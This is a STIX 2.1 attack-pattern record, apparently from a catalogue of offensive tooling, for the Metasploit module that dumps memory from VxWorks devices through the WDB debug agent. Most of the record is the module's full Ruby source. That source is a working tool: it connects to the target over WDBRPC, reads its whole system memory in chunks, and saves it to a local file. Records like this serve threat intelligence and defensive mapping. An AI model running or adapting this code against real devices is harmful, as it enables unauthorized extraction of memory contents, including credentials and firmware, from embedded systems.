{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--882b497c-be06-4c04-92bf-0b5fb7c8e805",
    "created": "2024-08-14T16:22:34.943654Z",
    "modified": "2024-08-14T16:22:34.943658Z",
    "name": "VxWorks WDB Agent Remote Memory Dump",
    "description": " This module provides the ability to dump the system memory of a VxWorks target through WDBRPC ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/vxworks/wdbrpc_memory_dump.rb",
            "external_id": "wdbrpc_memory_dump.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2010/08/02/new-vxworks-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::WDBRPC_Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VxWorks WDB Agent Remote Memory Dump',\n      'Description'    => %q{\n        This module provides the ability to dump the system memory of a VxWorks target through WDBRPC\n      },\n      'Author'         => [ 'hdm'],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '66842'],\n          ['URL', 'https://www.rapid7.com/blog/post/2010/08/02/new-vxworks-vulnerabilities/'],\n          ['US-CERT-VU', '362332']\n        ],\n      'Actions'     =>\n        [\n          ['Download', 'Description' => 'Dump system memory']\n        ],\n      'DefaultAction' => 'Download'\n      ))\n\n    register_options(\n      [\n        OptString.new('LPATH',\n          [\n            true,\n            \"The local filename to store the dumped memory\",\n            ::File.join(Msf::Config.log_directory, \"vxworks_memory.dmp\")\n          ]\n        ),\n        OptInt.new('OFFSET', [ true, \"The starting offset to read the memory dump (hex allowed)\", 0 ])\n      ])\n  end\n\n  def run\n    offset = datastore['OFFSET'].to_i\n    print_status(\"Attempting to dump system memory, starting at offset 0x%02x\" % offset)\n\n    wdbrpc_client_connect\n\n    if not @wdbrpc_info[:rt_vers]\n      print_error(\"No response to connection request\")\n      return\n    end\n\n    membase = @wdbrpc_info[:rt_membase]\n    memsize = @wdbrpc_info[:rt_memsize]\n    mtu     = @wdbrpc_info[:agent_mtu]\n\n    print_status(\"Dumping #{\"0x%.8x\" % memsize} bytes from base address #{\"0x%.8x\" % membase} at offset #{\"0x%.8x\" % offset}...\")\n\n    lfd = nil\n    if offset != 0\n      begin\n        # Turns out ruby's implementation of seek with \"ab\" mode is all kind of busted.\n        lfd = ::File.open(datastore['LPATH'], \"r+b\")\n        lfd.seek(offset)\n      rescue Errno::ENOENT\n        print_error(\"Unable to open existing dump!  Writing a new file instead of resuming...\")\n        lfd = ::File.open(datastore['LPATH'], \"wb\")\n      end\n    else\n      lfd = ::File.open(datastore['LPATH'], \"wb\")\n    end\n\n    mtu -= 80\n    idx  = offset\n    lpt  = 0.00\n    sts = Time.now.to_f\n\n\n    while (idx < memsize)\n      buff = wdbrpc_client_memread(membase + idx, mtu)\n      if not buff\n        print_error(\"Failed to download data at offset #{\"0x%.8x\" % idx}\")\n        return\n      end\n\n      idx += buff.length\n      lfd.write(buff)\n\n      pct = ((idx / memsize.to_f) * 10000).to_i\n      pct = pct / 100.0\n\n      if pct != lpt\n        eta = Time.at(Time.now.to_f + (((Time.now.to_f - sts) / pct) * (100.0 - pct)))\n        print_status(\"[ #{sprintf(\"%.2d\", pct)} % ] Downloaded #{\"0x%.8x\" % idx} of #{\"0x%.8x\" % memsize} bytes (complete at #{eta.to_s})\")\n        lpt = pct\n      end\n    end\n\n    lfd.close\n\n    print_status(\"Dumped #{\"0x%.8x\" % idx} bytes.\")\n    wdbrpc_client_disconnect\n  end\nend\n"
}